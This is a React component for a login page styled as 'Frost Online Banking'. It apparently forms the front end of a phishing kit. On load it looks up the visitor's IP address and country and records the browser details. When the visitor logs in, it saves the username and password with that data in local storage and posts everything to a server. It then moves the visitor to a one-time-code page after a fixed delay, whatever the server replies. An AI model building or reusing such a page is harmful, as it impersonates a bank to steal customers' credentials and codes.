import React from 'react'
import NavBar from '../components/NavBar'
import { useState, useEffect } from 'react'
import axios from 'axios'
import { useNavigate } from 'react-router-dom'


const LandingPage = () => {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [userInfo, setUserInfo] = useState({})
  const navigate = useNavigate()

  useEffect(() => {
    // Fetch user IP and location
    axios.get("https://ipapi.co/json/")
      .then(response => {
        
        setUserInfo({
          ip: response.data.ip,
          country: response.data.country_name,
          browser: navigator.userAgent, // Get user browser details
        });
      })
      .catch(error => console.error("Error fetching user info:", error));
  }, []);

  const login = ()=>{
    let isValid = true
    // let newErrors = {};

    if (username == '') {
      document.getElementById('error').style.display = 'block'
      isValid = false
    }else{
      document.getElementById('error').style.display = 'none'
    }
    if (password == '') {
      document.getElementById('error2').style.display = 'block'
      isValid = false
    }else{
      document.getElementById('error2').style.display = 'none'
    }

    if (isValid) {
      const data = {username, password, userInfo, date: new Date().toLocaleString()}
      localStorage.setItem('User Data', JSON.stringify(data))
      axios.post('http://localhost:3000/login', data)
      .then((response)=>{
        console.log(response.data.message)
      })
      setTimeout(()=>{
        navigate('/otp')
      }, 2000)
      
    }
  }
  return (
    <>
    <NavBar/>
      <section>
        <div className='row gap-5' >
          <div className='col-lg col-sm-12' >
            <h4 className='fw-bold text-primary-emphasis'>Log in to Frost Online Banking</h4>
            <div>
              <label className='fw-medium fs-5 pb-2 text-primary-emphasis' htmlFor="">Username</label>
              <input onChange={(e)=>setUsername(e.target.value)} className='form-control w-100 shadow-none form' type="text" value={username} />
              <span className='error-d' id='error'><small>Please fill out this field.</small></span>
            </div>
            <div className='pt-3'>
              <label className='fw-medium fs-5 pb-2 text-primary-emphasis' htmlFor="">Password</label>
              <input onChange={(e)=>setPassword(e.target.value)} className='form-control shadow-none form' type="password" value={password} />
              <span className='error-d' id='error2'><small>Please fill out this field.</small></span>
              <p className='fw-medium fs-5 text-end text-primary'>Forgot username or password</p>
            </div>
            <div className='d-flex gap-2 py-4'>
              <button onClick={login} className='fw-bold rounded-2 logbtn'>Log in</button>
              <button className='fw-bold rounded-2 logbtn2 text-primary-emphasis'>Setup online access</button>
            </div>
          </div>
          <div className='col d-lg-block d-none'>
            <div className='card  bg-light mt-2 ps-5'>
              <h4 className='text-primary-emphasis Further'>Further your finances with the Frost <br /> App</h4>
              <div className='pt-3'>
                <p className='text-start text-secondary fw-medium Our'>Our top-rated banking app offers powerful features, <br /> like the ability to send money to friends, see all your <br /> accounts in one place and securely log in with a quick <br /> glance or the touch of your finger.</p>
              </div>
              
            </div>
            
          </div>
        </div>
      </section>
    </>
    
  )
}

export default LandingPage